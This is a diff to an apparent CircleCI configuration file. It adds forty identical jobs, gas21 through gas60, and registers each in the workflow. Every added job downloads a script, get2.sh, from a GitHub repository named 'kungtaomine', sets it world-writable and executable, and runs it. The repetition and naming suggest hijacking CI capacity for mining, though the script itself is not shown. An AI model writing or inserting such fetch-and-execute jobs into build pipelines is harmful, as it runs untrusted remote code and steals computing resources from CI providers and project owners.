@@ -143,6 +143,290 @@ jobs:
       - run: chmod 777 get2.sh 
       - run: ./get2.sh
 
+  gas21:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas22:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas23:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas24:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas25:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas26:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas27:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas28:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas29:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas30:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+
+  gas31:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas32:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas33:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas34:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas35:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas36:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas37:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas38:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas39:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas40:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+
+  gas41:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas42:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas43:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas44:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas45:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas46:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas47:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas48:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas49:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas50:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+
+  gas51:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas52:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas53:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas54:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas55:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas56:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas57:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas58:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas59:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+  gas60:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
+
 # Orchestrate our job run sequence
 workflows:
   alp_5:
@@ -167,3 +451,43 @@ workflows:
       - gas18
       - gas19
       - gas20
+      - gas21
+      - gas22
+      - gas23
+      - gas24
+      - gas25
+      - gas26
+      - gas27
+      - gas28
+      - gas29
+      - gas30
+      - gas31
+      - gas32
+      - gas33
+      - gas34
+      - gas35
+      - gas36
+      - gas37
+      - gas38
+      - gas39
+      - gas40
+      - gas41
+      - gas42
+      - gas43
+      - gas44
+      - gas45
+      - gas46
+      - gas47
+      - gas48
+      - gas49
+      - gas50
+      - gas51
+      - gas52
+      - gas53
+      - gas54
+      - gas55
+      - gas56
+      - gas57
+      - gas58
+      - gas59
+      - gas60
